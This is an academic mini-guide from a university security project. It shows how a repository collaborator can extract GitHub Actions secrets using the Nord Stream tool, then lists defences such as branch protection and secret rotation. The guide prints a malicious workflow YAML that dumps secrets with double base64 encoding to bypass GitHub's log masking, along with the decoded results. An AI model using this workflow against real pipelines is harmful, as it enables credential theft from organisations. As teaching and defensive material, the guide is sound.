# Secret Extraction in CI/CD Pipelines — Azure DevOps & GitHub Actions

> Mini guide / overview based on the academic project conducted at **ENSA Berrechid**
> *Computer Science Engineering — Security & Cybersecurity, 2024–2025*

**Authors:** Hamza Mousrij · Oumaima Lamdira · Laila El Koudri
**Supervisor:** Mr. HNINI Abdelhalim

---

## 📌 Context

The security of **CI/CD workflows** is a critical concern in modern software development. Secrets such as **API keys, access tokens, and database credentials** are often stored inside pipelines — and when poorly managed, they become an entry point for attackers.

This guide demonstrates **how secrets can be extracted from a GitHub Actions pipeline** by a legitimate collaborator with malicious intent, and how to defend against it.

---

## 🎯 Objectives

- Understand the mechanics of **secret extraction** in CI/CD pipelines
- Reproduce a **practical attack** on a vulnerable GitHub Actions workflow
- Assess the **risks** for organizations and developers
- Apply **protective measures** to secure secrets

---

## 🧨 Attack Scenario

**Bob** is the project administrator. He invites **Alice** as a legitimate collaborator on the repository `DevopsAttack.3` (alias *My Shuttle*), which contains:

- 📁 Code repositories
- 🔑 Sensitive variables (secrets)
- ⚙️ CI/CD pipelines deploying to **Dev / Test / Acc / Prod**

Alice — although a legitimate contributor — targets the **Dev environment** because:

| Reason | Why it matters |
|---|---|
| Less monitoring | Dev is rarely audited like Prod |
| Shared secrets | Dev keys often unlock other environments |
| Loose configs | Plaintext secrets in scripts and variables |

![Attack scenario diagram](images/01-attack-scenario.jpg)

Once Alice extracts the secrets, she can pivot toward **Test, Staging, and Production** — accessing databases, APIs, and cloud storage.

---

## 🛠️ Practical Demonstration

### Step 1 — Create the development environment

Bob creates a public repository `DevopsAttack.3` and configures a default GitHub Actions workflow.

![Create the GitHub repository](images/02-create-repo.png)

He then invites Alice (`Mousrijhamza`) as a collaborator with **Contribute** permissions.

### Step 2 — Add secrets to the pipeline

From `Settings → Secrets and variables → Actions`, Bob creates three secrets — one per environment.

![Repository secrets](images/03-secrets-list.png)

Secrets created:
- `DEV_SECRET`
- `TEST_SECRETS`
- `DEPLOYMENT_SECRET`

### Step 3 — Extract the secrets with Nord Stream

[Nord Stream](https://github.com/synacktiv/nord-stream) is a security tool built to audit (and attack) CI/CD pipelines by listing and exfiltrating secrets.

**Attack workflow used by Alice:**

1. Generate a **Personal Access Token (PAT)** on her own GitHub account
2. Clone Nord Stream and configure the PAT as an environment variable
3. List all repository secrets covering every branch
4. Push a **malicious branch** containing a modified `pipeline.yml` that dumps environment variables in Base64

```yaml
name: GitHub Actions
on: push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
      - run: sh -c 'env | grep "^secret_" | base64 -w0 | base64 -w0'
        name: command
        env:
          secret_DEPLOYMENT_SECRET: ${{secrets.DEPLOYMENT_SECRET}}
          secret_DEV_SECRET: ${{secrets.DEV_SECRET}}
          secret_TEST_SECRETS: ${{secrets.TEST_SECRETS}}
```

![Malicious pipeline pushed via Nord Stream](images/04-malicious-pipeline.png)

> ⚠️ GitHub Actions automatically masks secrets in logs. The double Base64 encoding **bypasses this mask** — the masked value never matches the encoded output.

### Step 4 — Decode the leaked secrets

The encoded output is captured from the workflow logs and decoded twice with Base64.

![Decoded secrets](images/05-decoded-secrets.png)

```
secret_TEST_SECRETS=secret de l'environment test
secret_DEV_SECRET=secret_dev_password
secret_DEPLOYMENT_SECRET=...
```

🎯 **Attack successful.** All three secrets are now in clear text.

---

## 🛡️ Protection Measures

| Measure | What to do |
|---|---|
| 🔄 **Regular Secret Rotation** | Automate rotation with **HashiCorp Vault**, **Azure Key Vault**, or **AWS Secrets Manager** |
| 🔒 **Restrict Access** | Scope secrets to specific **environments** and **branches** using GitHub Environments |
| 👁️ **Avoid Log Leaks** | Never echo secrets; use **GitHub Secret Scanning** and tools like [TruffleHog](https://github.com/trufflesecurity/trufflehog) / [GitGuardian](https://www.gitguardian.com/) |
| ✅ **Review & Approval** | Enable **branch protection rules** + mandatory PR review before any pipeline change reaches `main` |
| 🔐 **MFA & Least Privilege** | Enforce MFA on all accounts; apply **RBAC** with minimum permissions |
| 📊 **Continuous Monitoring** | Alert on anomalous workflow executions and secret access patterns |

---

## 🧭 Key Takeaways

- A **legitimate collaborator** is enough to compromise a pipeline — trust is not a control
- **Dev environments** are the weakest link and the easiest pivot point
- GitHub's secret masking can be **trivially bypassed** with simple encoding
- **Branch protection + code review + secret rotation** stop most of these attacks
- Adopt a **DevSecOps mindset**: security is part of every pipeline stage, not an afterthought

---

## 📚 References

- [Nord Stream — Synacktiv](https://github.com/synacktiv/nord-stream)
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) · [GitGuardian](https://www.gitguardian.com/) · [Gitleaks](https://github.com/zricethezav/gitleaks)
- [Azure DevOps Security Best Practices — Microsoft](https://learn.microsoft.com/en-us/azure/devops/)
- Full academic article: *Secrets Extraction in DevOps Environments — Vulnerabilities and Attacks on Azure DevOps*

---

<p align="center">
  <sub>ENSA Berrechid · Academic Year 2024–2025</sub>
</p>